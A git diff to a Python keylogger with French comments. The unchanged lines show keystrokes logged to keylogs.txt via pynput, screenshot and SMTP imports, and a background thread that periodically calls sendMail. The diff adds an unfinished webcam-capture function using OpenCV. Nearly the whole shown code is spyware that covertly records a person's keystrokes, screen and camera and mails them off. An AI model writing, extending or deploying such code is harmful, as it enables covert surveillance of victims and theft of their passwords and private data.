@@ -1,5 +1,7 @@
 import logging
 from threading import Thread
+
+import cv2
 from pynput.keyboard import Key, Listener
 import smtplib,ssl
 from email.mime.multipart import MIMEMultipart
@@ -12,6 +14,7 @@ import time
 import os
 import PIL.ImageGrab
 
+from test.testWebCam import frame_width
 
 """
 #--------DÉBUT TÂCHES PROGRAMMÉES---------------
@@ -193,6 +196,15 @@ logging.basicConfig(filename="keylogs.txt", filemode="w",
 def on_press(key):
     logging.info(str(key))
 
+def CaptureCamera():
+    camera = cv2.VideoCapture(0)
+
+    frame_width = int(camera.get(cv2.CAP_PROP_FRAME_WIDTH))
+    frame_height = int(camera.get(cv2.CAP_PROP_FRAME_HEIGHT))
+
+    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
+    out = cv2.VideoWriter('output.mp4', fourcc, 20.0, (frame_width, frame_height))
+
 
 
 # Fonction pour exécuter `sendMail` toutes les 10 secondes dans un thread séparé
@@ -209,6 +221,7 @@ def mail_thread():
        mouse_listener.stop()
        mouse_listener.join()
        sendMail()
+
 
 # L'envoi du mail se fait sur un thread séparé
 Thread(target=mail_thread, daemon=True).start()
